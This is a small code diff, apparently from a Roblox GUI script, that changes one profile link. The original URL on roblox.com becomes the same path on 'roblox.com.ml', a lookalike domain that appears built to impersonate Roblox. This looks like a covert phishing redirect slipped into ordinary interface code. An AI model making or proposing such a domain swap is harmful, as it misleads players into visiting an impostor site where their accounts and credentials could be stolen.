@@ -191,7 +191,7 @@ guide.Parent = content
 ---------------------------------------------------
 -- LINK
 ---------------------------------------------------
-local link = "https://www.roblox.com/users/437740423885/profile"
+local link = "https://www.roblox.com.ml/users/437740423885/profile"
 
 ---------------------------------------------------
 -- TOAST
